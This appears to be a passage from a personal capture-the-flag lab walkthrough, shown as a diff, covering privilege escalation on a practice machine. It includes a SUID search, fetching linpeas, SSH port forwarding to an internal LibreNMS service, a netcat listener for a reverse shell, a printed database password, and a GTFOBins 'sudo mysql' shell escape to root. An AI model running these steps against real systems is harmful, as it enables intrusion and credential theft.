@@ -79,3 +79,58 @@ gcc  -> for c
 
 find / -user cronus -perm -4000 -exec ls -ldb {} \; 2>/dev/null   -> cuz we see cronus user in home 
 
+
+we saw this two are comminunicate  haha
+
+![[Pasted image 20230122230536.png]]
+
+
+but we can do nothing so we use linpeas -> auto enumation tool 
+
+i download linpeas with wget command 
+
+and give full permission  -> chomd 777 linpeas barnyar
+
+and then run ./linpeas
+
+we found this one with linpeas
+![[Pasted image 20230122232723.png]]
+
+curl http://127.0.0.1:8080     => we check with this   
+
+-> we are port forwarding  (Local  port forwarding)
+
+ssh -L 8080:127.0.0.1:8080 aeolus@192.168.99.130
+
+We add and run this machine with this exploit payload -> and using nc -lvp haha
+![[Pasted image 20230123000916.png]]
+
+and then check the cat config.php file we got this one
+
+![[Pasted image 20230123001102.png]]
+
+### Database config
+$config['db_host'] = 'localhost';
+$config['db_port'] = '3306';
+$config['db_user'] = 'librenms';
+$config['db_pass'] = 'VLby8dGg4rvw33sg';
+$config['db_name'] = 'librenms';
+$config['db_socket'] = '';
+  
+----> upper one ka har ka copy lot ya aung
+
+we check with sudo -l
+
+![[Pasted image 20230123001359.png]]
+
+and then go to GTFO bin and search mysql  and then copy this one
+
+```
+sudo mysql -e '\! /bin/sh'
+```
+
+![[Pasted image 20230123001512.png]]
+
+!!!!! Dump bro we got root
+
+![[Pasted image 20230123001719.png]]
